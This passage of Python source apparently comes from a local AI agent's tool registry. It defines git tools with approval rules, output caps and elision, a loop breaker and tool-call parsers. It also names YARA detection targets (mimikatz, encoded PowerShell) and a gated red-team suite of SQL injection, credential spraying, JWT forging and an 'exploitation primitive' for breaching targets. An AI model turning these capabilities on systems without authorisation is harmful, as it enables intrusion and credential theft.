            "registry autorun keys, process-injection API combos, mimikatz, "
            "base64-encoded MZ headers, encoded PowerShell). Pass rules='/abs/"
            "path/to/my.yar' to use a custom rule file, or rules='rule X {...}' "
            "for inline source. Pure-Python (libyara), no approval. Pair with "
            "binary_inspect for triage."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "File or directory to scan, in the workspace"},
                "rules": {"type": "string", "description": "Optional .yar/.yara file path or inline rule source. Empty = bundled defaults."},
                "recursive": {"type": "boolean", "description": "Walk subdirectories. Default false."},
                "max_files": {"type": "integer", "description": "Cap files scanned. default 200, max 5000"},
                "max_size": {"type": "integer", "description": "Skip files larger than this many bytes. default 200 MiB."},
                "timeout": {"type": "integer", "description": "Per-file YARA timeout in seconds. default 60, max 600"},
            },
            "required": ["path"],
        },
        "fn": tool_yara_scan,
    },
    # ---- git -----------------------------------------------------------------
    "git_status": {
        "description": (
            "Show working tree state for a repo: branch, ahead/behind counters, "
            "staged/unstaged/untracked files (porcelain v1). Use to find out what "
            "would be committed before calling git_add/git_commit. Read-only, "
            "no approval. `path` is any folder inside the repo (workspace-only)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Folder inside the repo (workspace path)."},
            },
            "required": ["path"],
        },
        "fn": tool_git_status,
    },
    "git_log": {
        "description": (
            "Recent commits as `<sha>\\t<author>\\t<date>\\t<subject>` lines. "
            "Read-only. Use to inspect history before committing or to grab a "
            "SHA for git_show / git_diff / git_reset."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Folder inside the repo."},
                "max_count": {"type": "integer", "description": "1-200, default 20"},
                "ref": {"type": "string", "description": "Optional branch/ref/range, e.g. 'main' or 'main..HEAD'"},
                "file": {"type": "string", "description": "Optional path to scope the log to one file."},
            },
            "required": ["path"],
        },
        "fn": tool_git_log,
    },
    "git_diff": {
        "description": (
            "Show a unified diff. Defaults to unstaged changes; pass staged:true "
            "for the index. Use this BEFORE git_commit to verify what will be "
            "committed, and BEFORE git_push to see what will go out. Read-only."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Folder inside the repo."},
                "staged": {"type": "boolean", "description": "Diff the index (--cached). Default false (worktree)."},
                "stat": {"type": "boolean", "description": "Summary stats only, not the full patch."},
                "ref": {"type": "string", "description": "Optional ref or range, e.g. 'HEAD~3' or 'main...HEAD'"},
                "file": {"type": "string", "description": "Optional single file/path to scope the diff."},
            },
            "required": ["path"],
        },
        "fn": tool_git_diff,
    },
    "git_branch": {
        "description": "List branches with their tracking remotes (`git branch -vv`). Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "all": {"type": "boolean", "description": "Include remote-tracking branches (-a)."},
                "remote": {"type": "boolean", "description": "Remotes only (-r)."},
            },
            "required": ["path"],
        },
        "fn": tool_git_branch,
    },
    "git_show": {
        "description": "Show a commit (or any ref) with its full patch. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "ref": {"type": "string", "description": "Commit/tag/ref. Default HEAD."},
                "stat": {"type": "boolean", "description": "Append --stat for a summary."},
            },
            "required": ["path"],
        },
        "fn": tool_git_show,
    },
    "git_remote": {
        "description": "List configured remotes and their fetch/push URLs. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
        "fn": tool_git_remote,
    },
    "git_add": {
        "description": (
            "Stage files for the next commit. Pass `paths` (list of file/dir "
            "paths relative to the repo) or `all:true` for `git add -A`. "
            "Requires user approval. Always run git_status BEFORE this to verify "
            "you're staging only what you mean to."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Folder inside the repo."},
                "paths": {"type": "array", "items": {"type": "string"}, "description": "Files/dirs to stage (relative to repo root)."},
                "all": {"type": "boolean", "description": "Use `git add -A` instead of explicit paths."},
            },
            "required": ["path"],
        },
        "fn": tool_git_add,
    },
    "git_commit": {
        "description": (
            "Create a commit. The `message` is passed as a single -m argument, so "
            "newlines are preserved (body separated from subject by a blank line "
            "in the same string is fine). Requires user approval. Run git_diff "
            "--staged BEFORE this to verify what's being committed. NEVER amend "
            "without explicit instruction."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "message": {"type": "string", "description": "Commit message. Multi-line ok."},
                "all": {"type": "boolean", "description": "Stage tracked changes first (-a)."},
                "amend": {"type": "boolean", "description": "Amend the previous commit. Use ONLY with explicit user request."},
                "no_edit": {"type": "boolean", "description": "With amend, keep the existing message."},
                "allow_empty": {"type": "boolean", "description": "Allow a commit with no changes."},
            },
            "required": ["path", "message"],
        },
        "fn": tool_git_commit,
    },
    "git_push": {
        "description": (
            "Push commits to a remote. Default: `git push` (uses upstream). For a "
            "brand new branch pass set_upstream:true and branch:'<name>'. "
            "Requires user approval. NEVER force-push without explicit request; "
            "if you must, use force_with_lease:true (safer than --force)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "remote": {"type": "string", "description": "e.g. 'origin'. Optional."},
                "branch": {"type": "string", "description": "Branch to push. Optional."},
                "set_upstream": {"type": "boolean", "description": "Pass -u to record the upstream."},
                "force_with_lease": {"type": "boolean", "description": "Force-push only if remote ref hasn't moved."},
                "tags": {"type": "boolean", "description": "Include tags."},
            },
            "required": ["path"],
        },
        "fn": tool_git_push,
    },
    "git_pull": {
        "description": "Fetch + merge from a remote. Requires user approval. Prefer rebase:true for a linear history.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "remote": {"type": "string"},
                "branch": {"type": "string"},
                "rebase": {"type": "boolean", "description": "git pull --rebase"},
                "ff_only": {"type": "boolean", "description": "git pull --ff-only — fail rather than merge."},
            },
            "required": ["path"],
        },
        "fn": tool_git_pull,
    },
    "git_fetch": {
        "description": "Fetch remote refs without merging. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "remote": {"type": "string"},
                "all": {"type": "boolean"},
                "prune": {"type": "boolean", "description": "--prune"},
                "tags": {"type": "boolean"},
            },
            "required": ["path"],
        },
        "fn": tool_git_fetch,
    },
    "git_checkout": {
        "description": (
            "Switch branches or restore files. Pass `target` = branch/ref name. "
            "Add create:true to create a new branch from current HEAD. To restore "
            "specific files from a ref, pass `files`. Requires user approval."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "target": {"type": "string", "description": "Branch name or ref."},
                "create": {"type": "boolean", "description": "Create the branch (-b)."},
                "files": {"type": "array", "items": {"type": "string"}, "description": "Optional file paths to checkout from `target`."},
            },
            "required": ["path", "target"],
        },
        "fn": tool_git_checkout,
    },
    "git_restore": {
        "description": (
            "Discard changes in tracked files. Pass `files` (required). With "
            "staged:true, unstages from the index instead of touching the worktree. "
            "Requires user approval — this is destructive."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "files": {"type": "array", "items": {"type": "string"}},
                "staged": {"type": "boolean", "description": "--staged: unstage instead of discard."},
                "source": {"type": "string", "description": "Optional --source ref to restore from."},
            },
            "required": ["path", "files"],
        },
        "fn": tool_git_restore,
    },
    "git_reset": {
        "description": (
            "Move HEAD and optionally the index/worktree to `target`. Modes: "
            "soft (HEAD only), mixed (default — HEAD + index), hard (HEAD + index "
            "+ worktree — DESTROYS uncommitted work), keep, merge. Requires "
            "user approval. NEVER use --hard without explicit user request."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "mode": {"type": "string", "enum": ["soft", "mixed", "hard", "keep", "merge"], "description": "Default 'mixed'."},
                "target": {"type": "string", "description": "Commit/ref. Optional (defaults to HEAD)."},
            },
            "required": ["path"],
        },
        "fn": tool_git_reset,
    },
    "git_init": {
        "description": "Initialize a new repo in `path` (must be inside the workspace). Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "initial_branch": {"type": "string", "description": "e.g. 'main'. Optional."},
            },
            "required": ["path"],
        },
        "fn": tool_git_init,
    },
    "git_clone": {
        "description": (
            "Clone a remote repo into a workspace folder. `dest` is the new repo "
            "directory and must not already exist (or must be empty). Requires "
            "user approval. Shallow clones via depth:N."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "dest": {"type": "string", "description": "Target directory inside the workspace."},
                "branch": {"type": "string", "description": "Optional --branch."},
                "depth": {"type": "integer", "description": "Optional --depth N."},
            },
            "required": ["url", "dest"],
        },
        "fn": tool_git_clone,
    },
}


_DESKTOP_TOOL_NAMES = {
    "screenshot", "describe_screen", "list_windows",
    "desktop_launch_app", "desktop_focus_window", "desktop_click",
    "desktop_type_text", "desktop_press_keys", "desktop_close_window",
}

# Tools whose results are bulky-by-design (string dumps, grep hits, disasm
# listings, signature scans). Truncated looser so the model can actually
# reason over the output instead of seeing the head + a cliff.
_ANALYSIS_TOOL_NAMES = {
    "strings_dump", "grep_files", "disasm_at",
    "binwalk_scan", "find_files", "file_inspect", "read_bytes",
    "network_snapshot",
    "scan_apk", "decompile_apk", "ghidra_analyze",
    "binary_inspect", "yara_scan",
    "scan_secrets", "parse_evtx", "analyze_pcap", "check_deps",
    "recon_port_scan", "recon_tls_audit", "recon_http_fingerprint",
    "recon_subdomains", "recon_dns",
    "recon_content_discovery", "recon_check_exposure", "recon_subdomain_takeover",
    "recon_cve_match", "recon_injection_probe", "recon_open_services",
    "recon_auth_spray", "recon_capture_evidence",
    "read_skeleton", "check_syntax", "run_tests",
    # git diffs and logs are bulky-by-design too — the model needs to read the
    # whole patch to write a sane commit message or to verify a push payload.
    "git_diff", "git_log", "git_show", "git_status",
}
# Per-tool result caps for the model context. Tools not listed here use the
# defaults in _tool_result_cap() below (16K for analysis tools, 4K otherwise).
# network_snapshot routinely returns ~20 KB on a busy host (per-connection
# entries + UDP listeners + top remotes/processes + DNS); 16K chops it
# mid-JSON and leaves the model with garbage, which is why it spirals into
# random run_powershell calls trying to recover.
# scan_apk on a real-world APK with deep:true and 200 findings + a few
# hundred exported components routinely lands in the 30-40 KB range.
_TOOL_RESULT_CAPS = {
    # read_file paginates its own 20KB chunks with an exact offset hint. Its
    # result cap MUST sit above the serialized chunk, or compress_tool_result
    # elides the content a SECOND time (head+tail) — mangling the chunk and the
    # continuation hint, which makes models thrash ("output got truncated").
    "read_file": 32000,

    "scan_secrets": 48000,
    "parse_evtx": 48000,
    "analyze_pcap": 48000,
    "check_deps": 24000,

    "network_snapshot": 32000,
    # recon_subdomains can return a few hundred CT-log subdomains; the rest
    # are compact JSON. Give the suite room so the report isn't chopped.
    "recon_subdomains": 32000,
    "recon_dns": 16000,
    "recon_port_scan": 16000,
    "recon_content_discovery": 24000,
    "recon_check_exposure": 16000,
    "recon_subdomain_takeover": 24000,
    "recon_cve_match": 24000,
    "recon_injection_probe": 16000,
    "recon_open_services": 16000,
    # Exploit responses (SSTI output, dumped configs, flag-bearing bodies) need
    # room so the model can read the whole thing and confirm access.
    "http_request": 16000,
    # Interactive sessions self-cap their output in read_model(); these are the
    # outer safety nets for the serialized envelope.
    "session_start": 16000,
    "session_send": 16000,
    "session_read": 16000,
    "sql_injection": 16000,  # dumped rows can be large
    "fuzz": 16000,           # many per-value response summaries
    "batch_probe": 16000,    # hits across many endpoints
    "scan_js_secrets": 16000,  # many secret hits across bundles
    "tcp_send": 32000,         # raw service/bot output can be verbose
    "scan_apk": 48000,
    "decompile_apk": 24000,
    # ghidra_analyze: imports + exports + 200 strings + decompiled function
    # is comfortably under 32K on real-world .so files. Bump to 40K so a
    # decompile of a chunky function isn't truncated mid-statement.
    "ghidra_analyze": 40000,
    # binary_inspect: header + sections + imports easily lands at 20-30 KB on
    # a real-world dll with hundreds of imports. Bump to 32K so the model
    # actually sees the full import table instead of a chopped sample.
    "binary_inspect": 32000,
    # yara_scan: matches across a directory can balloon. 32K is enough room
    # for a full report on ~50 hit files without trampling the rest of context.
    "yara_scan": 32000,
    # git_diff with a multi-file refactor easily clears 50K. The model needs
    # the whole patch to write an accurate commit message; truncation here
    # produces fabricated change descriptions.
    "git_diff": 64000,
    "git_show": 48000,
    "git_log": 24000,
}

def _tool_result_cap(name: str) -> int:
    if name in _TOOL_RESULT_CAPS:
        return _TOOL_RESULT_CAPS[name]
    return 16000 if name in _ANALYSIS_TOOL_NAMES else 4000


# Fields known to carry the bulk of a tool's output. We elide these in place
# (head + ellipsis marker + tail) BEFORE serializing the result so the JSON
# envelope stays valid even on very large outputs — chopping the serialized
# string at a fixed character count, the previous behavior, would produce
# truncated-mid-value JSON that the model can't parse and that hides the
# trailing diagnostics (errors usually appear at the bottom of stdout).
_BULK_TOOL_FIELDS = ("stdout", "stderr", "content", "text", "output", "html", "body")


def _elide_text(s: str, cap: int) -> str:
    """Head/tail line-aware elision. Keep ~half the budget on each end with
    a one-line summary marker between them. cap is in characters (consistent
    with the rest of the tool-result pipeline). Returns s unchanged when
    s already fits."""
    if not isinstance(s, str) or len(s) <= cap:
        return s
    lines = s.split("\n")
    # Single-blob with no newlines (e.g. a giant base64 PNG): char-level
    # slice is the only sane fallback.
    if len(lines) <= 4:
        half = max(1, (cap - 80) // 2)
        return s[:half] + f"\n… [{len(s) - cap} chars elided] …\n" + s[-half:]
    # Line-aware elision: greedily fill head and tail keeping them roughly
    # balanced by char count. Tokens scale ~linearly with chars for typical
    # text, so this also balances by token cost.
    target_each = max(256, (cap - 80) // 2)
    head_lines: list[str] = []
    tail_lines: list[str] = []
    head_chars = 0
    tail_chars = 0
    i = 0
    j = len(lines) - 1
    while i <= j and (head_chars < target_each or tail_chars < target_each):
        if head_chars <= tail_chars:
            head_lines.append(lines[i])
            head_chars += len(lines[i]) + 1
            i += 1
        else:
            tail_lines.append(lines[j])
            tail_chars += len(lines[j]) + 1
            j -= 1
        if i > j:
            break
    omitted = j - i + 1
    if omitted <= 0:
        return s  # ate the whole thing, no elision needed
    omitted_chars = sum(len(lines[k]) + 1 for k in range(i, j + 1))
    marker = f"… [{omitted} of {len(lines)} lines elided · {omitted_chars} chars] …"
    return "\n".join(head_lines) + "\n" + marker + "\n" + "\n".join(reversed(tail_lines))


def _truncation_envelope(result: Any, cap: int, original_chars: int) -> str:
    """Last-resort fallback. Returns a tiny, *valid* JSON object describing
    that the result was too large even after compression. Never produces
    malformed JSON — the model treats this as a structured "I tried, it
    didn't fit" message instead of walking off a cliff into truncated bytes."""
    keys = list(result.keys()) if isinstance(result, dict) else None
    return json.dumps({
        "_truncated": True,
        "_note": (
            f"tool result exceeded {cap} chars even after head/tail elision "
            f"(original ~{original_chars} chars). "
            f"Re-run the tool with a tighter scope or a smaller range."
        ),
        "keys_present": keys,
    }, ensure_ascii=False)


def compress_tool_result(name: str, result: Any, cap: int) -> str:
    """Serialize a tool result as JSON for the model, applying line-aware
    head/tail elision to known bulk fields BEFORE serializing. Errors are
    never elided (they're always small and always critical). Iteratively
    tightens the per-field budget if JSON escaping overhead pushes the
    result over cap; falls back to a minimal truncation envelope rather
    than producing malformed JSON."""
    # Non-dict results (lists, scalars). For lists we elide the JSON-string
    # form; for scalars we just serialize. Both stay valid JSON because we
    # only ever return either the full serialization or the safe envelope.
    if not isinstance(result, dict):
        s = json.dumps(result, ensure_ascii=False, default=str)
        if len(s) <= cap:
            return s
        # Try to keep a head sample of the list as a separate JSON; otherwise
        # fall through to the envelope.
        if isinstance(result, list) and len(result) > 4:
            for keep in (200, 100, 50, 20, 10, 5):
                if keep >= len(result):
                    continue
                sample = result[:keep]
                sampled = {
                    "_truncated": True,
                    "_note": f"showing first {keep} of {len(result)} items",
                    "items": sample,
                }
                ss = json.dumps(sampled, ensure_ascii=False, default=str)
                if len(ss) <= cap:
                    return ss
        return _truncation_envelope(result, cap, len(s))

    # Errors: never compress, always pass through verbatim. They're critical
    # and almost always small. If a tool somehow returns an error PLUS a
    # huge stdout (rare), strip the bulk fields rather than chopping the
    # error message itself.
    if isinstance(result.get("error"), str) and len(result["error"]) < cap // 2:
        s = json.dumps(result, ensure_ascii=False, default=str)
        if len(s) <= cap:
            return s
        slim = {k: v for k, v in result.items() if k not in _BULK_TOOL_FIELDS}
        slim["_note"] = "bulk fields stripped — error preserved verbatim"
        ss = json.dumps(slim, ensure_ascii=False, default=str)
        if len(ss) <= cap:
            return ss
        return _truncation_envelope(result, cap, len(s))

    s_full = json.dumps(result, ensure_ascii=False, default=str)
    if len(s_full) <= cap:
        return s_full

    # In-place compression of bulk fields. Budget is split across the bulk
    # fields present so {stdout: 100KB, stderr: 50KB} shrink proportionally
    # instead of one eating the whole budget. Iteratively tighten because
    # JSON escaping (\n → \\n etc.) inflates the serialized size by a few
    # percent — the first attempt often lands just over cap.
    bulk_present = [
        k for k in _BULK_TOOL_FIELDS
        if isinstance(result.get(k), str) and len(result[k]) > 200
    ]
    if bulk_present:
        scratch = dict(result)
        for k in bulk_present:
            scratch[k] = ""
        overhead = len(json.dumps(scratch, ensure_ascii=False, default=str))
        # Start with the full available budget per field, then halve until
        # the serialized result fits or the per-field budget would be too
        # small to be useful.
        base_budget = max(256, (cap - overhead) // len(bulk_present))
        for attempt in range(6):
            per_field = max(256, base_budget >> attempt)
            compressed = dict(result)
            for k in bulk_present:
                compressed[k] = _elide_text(result[k], per_field)
            s = json.dumps(compressed, ensure_ascii=False, default=str)
            if len(s) <= cap:
                return s
            if per_field <= 256:
                break  # can't tighten further usefully

    # Final fallback: minimal envelope. Always valid JSON.
    return _truncation_envelope(result, cap, len(s_full))


# Red-team recon suite — gated behind `red_team_enabled` so a normal coding
# turn doesn't carry ~13 tools it will never call (real token cost every turn).
_RED_TEAM_TOOL_NAMES = {
    "recon_dns", "recon_subdomains", "recon_tls_audit", "recon_http_fingerprint",
    "recon_port_scan", "recon_content_discovery", "recon_check_exposure",
    "recon_subdomain_takeover", "recon_cve_match", "recon_injection_probe",
    "recon_open_services", "recon_auth_spray", "recon_capture_evidence",
    # Active exploitation primitive — lets the flow actually breach, not just
    # flag suspicion. Gated with the rest of the suite.
    "http_request",
    # Token encoder/decoder (Burp Decoder equivalent) — lets a model forge a
    # cookie/JWT without hand-computing base64. Gated with the suite.
    "encode_decode",
    # JWT decode/forge/crack — modern auth attacks (alg:none, weak-secret).
    "jwt_tool",
    # sqlmap-lite, param fuzzer/enumerator, and finding validator — so a miss
    # is a model decision, not a missing capability.
    "sql_injection",
    "fuzz",
    "validate_finding",
    # one payload set -> every parameterized endpoint at once
    "batch_probe",
    # front-end secret hunting + CORS misconfig testing
    "scan_js_secrets",
    "cors_probe",
    # raw TCP for non-HTTP services and report-to-admin/CTF bots
    "tcp_send",
}


def _active_tools() -> dict:
    """Return TOOLS filtered by current settings — desktop tools only show when
    desktop automation is enabled, and the red-team recon suite only when red
    team mode is on, so a normal coding turn carries neither (and pays no token
    cost for tools it can't or won't use)."""
    s = get_settings()
    excluded: set[str] = set()
    if not s.get("desktop_enabled"):
        excluded |= _DESKTOP_TOOL_NAMES
    if not s.get("red_team_enabled"):
        excluded |= _RED_TEAM_TOOL_NAMES
    # The sandbox tool is only useful once the guest is provisioned; don't pay
    # its token cost (or tempt the model to call it) before then.
    if not _sandbox_ready_cached():
        excluded.add("sandbox_run")
    if not excluded:
        return TOOLS
    return {k: v for k, v in TOOLS.items() if k not in excluded}


def tools_for_llama() -> list[dict]:
    """Tool spec for llama-server's OpenAI-compatible /v1/chat/completions.
    Same shape as OpenAI function calling."""
    out = []
    for name, t in _active_tools().items():
        out.append({
            "type": "function",
            "function": {
                "name": name,
                "description": t["description"],
                "parameters": t["parameters"],
            },
        })
    return out



# Common synonyms the model invents instead of the canonical tool names. Map
# them so a single typo doesn't burn an entire tool round on "unknown tool".
TOOL_ALIASES = {

    "skeleton": "read_skeleton",
    "ast": "read_skeleton",
    "syntax": "check_syntax",
    "lint": "check_syntax",
    "test": "run_tests",
    "pytest": "run_tests",


    "pcap": "analyze_pcap",
    "pcapng": "analyze_pcap",
    "analyze_packet": "analyze_pcap",
    "evtx": "parse_evtx",
    "event_log": "parse_evtx",
    "secret_scan": "scan_secrets",
    "find_secrets": "scan_secrets",
    "cve_scan": "check_deps",
    "deps_scan": "check_deps",
    "audit_headers": "audit_http_headers",
    "security_headers": "audit_http_headers",

    "create_file": "write_file",
    "save_file": "write_file",
    "make_file": "write_file",
    "new_file": "write_file",
    "patch_file": "edit_file",
    "modify_file": "edit_file",
    "update_file": "edit_file",
    "view_file": "read_file",
    "open_file": "read_file",
    "cat_file": "read_file",
    "cat": "read_file",
    "list_dir": "list_directory",
    "ls": "list_directory",
    "ls_dir": "list_directory",
    "dir": "list_directory",
    "rm": "delete_file",
    "remove_file": "delete_file",
    "rm_file": "delete_file",
    "powershell": "run_powershell",
    "shell": "run_powershell",
    "bash": "run_powershell",
    "cmd": "run_powershell",
    "exec": "run_powershell",
    "search_web": "web_search",
    "google": "web_search",
    "duckduckgo": "web_search",
    "fetch": "web_fetch",
    "http_get": "web_fetch",
    "screenshot_screen": "screenshot",
    "take_screenshot": "screenshot",
    "windows": "list_windows",
    "save_memory": "remember",
    "delete_memory": "forget",
    "netstat": "network_snapshot",
    "network_scan": "network_snapshot",
    "inspect_network": "network_snapshot",
    "list_connections": "network_snapshot",
    "sniff_network": "network_snapshot",
    # APK analysis aliases — models naturally reach for these synonyms.
    "apk_scan": "scan_apk",
    "analyze_apk": "scan_apk",
    "apk_analyze": "scan_apk",
    "android_scan": "scan_apk",
    "apk_security_scan": "scan_apk",
    "apk_decompile": "decompile_apk",
    "jadx": "decompile_apk",
    "jadx_decompile": "decompile_apk",
    "decompile": "decompile_apk",
    # Ghidra aliases — models reach for "ghidra" as a verb regularly.
    "ghidra": "ghidra_analyze",
    "pyghidra": "ghidra_analyze",
    "analyze_native": "ghidra_analyze",
    "analyze_binary": "ghidra_analyze",
    "decompile_native": "ghidra_analyze",
    "disasm_binary": "ghidra_analyze",
    "static_analyze": "ghidra_analyze",
    # binary_inspect aliases — models reach for these synonyms when triaging
    # native binaries before deciding whether to call ghidra_analyze.
    "pe_info": "binary_inspect",
    "pe_inspect": "binary_inspect",
    "elf_info": "binary_inspect",
    "elf_inspect": "binary_inspect",
    "binary_info": "binary_inspect",
    "exe_inspect": "binary_inspect",
    "inspect_binary": "binary_inspect",
    "inspect_pe": "binary_inspect",
    "inspect_elf": "binary_inspect",
    "file_format": "binary_inspect",
    "binary_triage": "binary_inspect",
    "triage_binary": "binary_inspect",
    # yara_scan aliases.
    "yara": "yara_scan",
    "scan_yara": "yara_scan",
    "yara_match": "yara_scan",
    "malware_scan": "yara_scan",
    "ioc_scan": "yara_scan",
    "ioc_match": "yara_scan",
}


def _resolve_tool_name(name: str) -> str:
    if not name:
        return name
    if name in TOOLS:
        return name
    lc = name.lower()
    if lc in TOOLS:
        return lc
    if lc in TOOL_ALIASES:
        return TOOL_ALIASES[lc]
    return name


# Per-turn tool-call history. Reset at the top of run_chat_turn so each
# user message gets a fresh counter; checked inside invoke_tool to break
# infinite loops where the model repeats the SAME tool with the SAME args
# (typical pattern: misreads a truncated response as a transient failure
# and retries 20+ times). threading.local keeps concurrent chats isolated.
_tool_call_history = threading.local()
TOOL_REPEAT_LIMIT = 3  # 4th identical call gets refused with a clear hint.

# Per-turn context — chat_id and other thread-local state that needs to be
# reachable from deep inside tool implementations without threading them
# through every function signature. _run_powershell reads chat_id from here
# when it logs an entry to cmd_history.jsonl so the History drawer can show
# which chat each command came from.
_chat_ctx = threading.local()


def _reset_tool_call_history() -> None:
    _tool_call_history.calls = {}
    _tool_call_history.writes = {}


# Rewrite-loop breaker: count full write_file rewrites per path per turn so a
# model that keeps "this is a mess, let me rewrite from scratch" (with no way to
# verify it's actually broken) gets forced into targeted edits instead of
# spiralling. Resets every turn alongside the tool-call history above.
REWRITE_LOOP_LIMIT = 2  # original write + one rewrite; the next is blocked


def _write_count(npath: str) -> int:
    return (getattr(_tool_call_history, "writes", None) or {}).get(npath, 0)


def _record_write(npath: str) -> None:
    w = getattr(_tool_call_history, "writes", None)
    if w is None:
        w = {}
        _tool_call_history.writes = w
    w[npath] = w.get(npath, 0) + 1


def _set_current_chat(chat_id: str) -> None:
    _chat_ctx.chat_id = chat_id


def _get_current_chat() -> str:
    return getattr(_chat_ctx, "chat_id", "") or ""


def _record_tool_call(canon: str, args: dict) -> int:
    """Records (canon, args) under a per-thread counter. Returns the new count."""
    sig = canon + ":" + json.dumps(args or {}, sort_keys=True, default=str)
    history = getattr(_tool_call_history, "calls", None)
    if history is None:
        history = {}
        _tool_call_history.calls = history
    history[sig] = history.get(sig, 0) + 1
    return history[sig]


def invoke_tool(name: str, args: dict) -> dict:
    canon = _resolve_tool_name(name)
    t = TOOLS.get(canon)
    if not t:
        # Surface the available names so a repair-retry round can fix a typo.
        return {"error": f"unknown tool: {name}", "available": sorted(TOOLS.keys())}
    # Loop-breaker. The 4th identical call (same tool, same args) within a
    # single turn returns a refusal explaining WHY retrying won't help. This
    # is the backstop for any tool where the model gets stuck in a "must
    # have been a glitch, try again" pattern — read_file truncation is the
    # most common trigger but it can happen on list_directory, etc. too.
    count = _record_tool_call(canon, args or {})
    # Session tools are stateful — the same args legitimately return DIFFERENT
    # output as the live process runs (the model polls session_read to wait for
    # more), so the "identical call = stuck loop" guard must not apply to them.
    if count > TOOL_REPEAT_LIMIT and not canon.startswith("session_"):
        suggestions = []
        if canon == "read_file":
            suggestions.append("for large files, use `offset` to read the next chunk (see the `hint` field in the truncated response)")
        if canon == "list_directory":
            suggestions.append("if you need a deeper level, pass the subdirectory as `path`")
        suggestion_blob = (". " + "; ".join(suggestions)) if suggestions else ""
        return {
            "error": (
                f"refused: {canon} has been called {count} times this turn with the "
                f"SAME arguments. Tool outputs are deterministic — repeating won't get "
                f"different bytes back. Either change the arguments{suggestion_blob}, or "
                f"end the turn and tell the user what you found so far."
            ),
            "repeat_count": count,
            "tool": canon,
            "loop_breaker": True,
        }
    try:
        return t["fn"](args or {})
    except Exception as e:
        traceback.print_exc()
        return {"error": str(e)}


# ---- tool-call parsing (fallback for models w/o native tools) -------------
# Self-healing — accepts lightly broken JSON from the model, since local
# models routinely emit trailing prose, unbalanced braces, or code fences.

TOOL_CALL_RE = re.compile(r"<tool_call>\s*(\{[\s\S]*?\})\s*</tool_call>", re.IGNORECASE)
TOOL_CALL_FENCE_RE = re.compile(r"```tool_call\s*\n([\s\S]*?)\n```", re.IGNORECASE)
# Extra dialects from non-OpenAI fine-tunes. Tier-2 fallback only — native
# tool_calls on the streamed delta still wins. Patterns are anchored on
# dialect-specific markers so they cannot collide with each other.
#   <call:NAME>{args}</call:NAME>      seen on BugTraceAI and similar tunes
#   <|python_tag|>{...}<|eom_id|>      llama-3.1 / 3.2 native format
#   [TOOL_CALLS][{...}, ...]           mistral native format
TOOL_CALL_NAMED_RE = re.compile(
    # Accept either </call> or </call:NAME> for the closer. BugTraceAI and
    # other gemma-derived tunes drop the name in the close tag.
    r"<call:([a-zA-Z0-9_\-]+)>\s*(\{[\s\S]*?\})\s*</call(?::\1)?>",
    re.IGNORECASE)
TOOL_CALL_PYTAG_RE = re.compile(
    r"<\|python_tag\|>\s*(\{[\s\S]*?\})\s*(?:<\|eom_id\|>|<\|eot_id\|>|$)",
    re.IGNORECASE)
TOOL_CALL_MISTRAL_RE = re.compile(
    r"\[TOOL_CALLS\]\s*(\[[\s\S]*?\])", re.IGNORECASE)
# XML-tag dialect: Hermes-3 / GLM-4 / some Qwen3 finetunes emit
#   <tool_call><function=NAME><parameter=KEY>VAL</parameter>...</function></tool_call>
# Tolerant: closing </function> and/or </tool_call> may be missing if the
# model truncates. We anchor on <tool_call> + <function=NAME> and then walk
# parameters until we hit a closer or the next tool_call/end-of-string.
TOOL_CALL_XMLTAG_RE = re.compile(
    r"<tool_call>\s*<function=([a-zA-Z0-9_\-\.]+)>"
    r"([\s\S]*?)"
    r"(?:</function>\s*</tool_call>|</tool_call>|(?=<tool_call>)|$)",
    re.IGNORECASE)
TOOL_PARAM_XMLTAG_RE = re.compile(
    r"<parameter=([a-zA-Z0-9_\-\.]+)>\s*([\s\S]*?)\s*</parameter>",
    re.IGNORECASE)
# Gemma 4 native tool-call dialect. Format:
#   <|tool_call>call:NAME{key:value,key:<|"|>string<|"|>,key:42}<tool_call|>
# where <|"|> is Gemma's special-token string delimiter (not a JSON quote).
# Asymmetric opener / closer is intentional — that's how Google spec'd it.
# Closer is forgiving so a truncated emit (model cut off before <tool_call|>)
# still parses up to end-of-string or the next opener.
# Spec: https://ai.google.dev/gemma/docs/capabilities/text/function-calling-gemma4
TOOL_CALL_GEMMA_RE = re.compile(
    r"<\|tool_call>\s*call\s*:\s*([\w.\-]+)\s*\{([\s\S]*?)\}\s*"
    r"(?:<tool_call\|>|(?=<\|tool_call>)|$)",
    re.IGNORECASE)
# Qwen native tool-call dialect. Format:
#   <|function_calls_begin|><|function_call|>{"name":"...","arguments":"..."}<|function_calls_end|>
TOOL_CALL_QWEN_RE = re.compile(
    r"<\|function_call\|>\s*(\{[\s\S]*?\})\s*(?:<\|function_calls_end\|>|(?=<\|function_call\|>)|$)",
    re.IGNORECASE)
# Self-closing XML tag dialect (often output by models like Gemma when prompted
# with certain schemas, or Llama 3 when hallucinating XML):
#   <tool_call name="..." arguments='...'/>
TOOL_CALL_SELFCLOSING_RE = re.compile(
    r"<tool_call\s+([^>]+)/>",
    re.IGNORECASE)
# Gemma / CodeGemma python-style function-call dialect. Google's Gemma
# function-calling spec has the model emit a PYTHON CALL inside a
# ```tool_code``` fence (sometimes wrapped in print(...)), NOT a JSON
# tool_call — e.g.  ```tool_code\nweb_search(query="casemiro news")\n```
